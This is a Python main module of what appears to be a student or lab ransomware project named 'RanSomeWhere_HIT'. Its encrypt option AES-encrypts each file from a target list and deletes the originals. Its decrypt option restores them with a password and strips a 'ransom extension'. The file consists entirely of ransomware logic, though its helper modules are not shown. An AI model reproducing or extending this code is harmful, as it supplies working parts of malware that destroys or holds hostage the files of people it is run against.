import aes
import files
import os
import enc_Pass

def Main():
    #encrypt files and decrypt files
    choice = input("Would you like to (E)ncrypt of (D)ecrypt or (P)assword?: ").upper()

    if choice == 'E':
        password =enc_Pass.gen() 
        #split the file name from the file path
        for i in files.getfiles_enc():
            file_name = i.split("/")[-1]
            print(file_name)
            file_path = i.replace(file_name, "")
            os.chdir(file_path)
            aes.encrypt(aes.getKey(password),file_name)
            try:
                os.remove(file_name)
            except OSError:
                pass
        Main()

    elif choice == 'D':
        password = input("Password: ")
        #remove the ransom extension
        for i in files.getfiles_dec():
            name = i.split("/")[-1]
            print(name)
            path = i.replace(name, "")
            os.chdir(path)
            # f = open("password.txt", "r")
            aes.decrypt(aes.getKey(password), name)
            os.remove(name)
        print("Done.")

    elif choice == 'P':
        choice1 =input("Did you encrypt the files already? in order to get the current password \n (Y)es / (N)o\n").upper()
        
        if choice1 =='Y':
            priv= input("You need to input the private key in order to decrypt the files\n")
            f = open('/home/kali/Desktop/RanSomeWhere_HIT/password.txt', 'r')
            file_contents = f.read()
            print("The password to your files is: : \n\n-",file_contents)
            f.close()
            Main()
        elif choice1 == 'N':
            Main()

    else:
        print("No option selected, closing...")

if __name__ == "__main__":
    Main()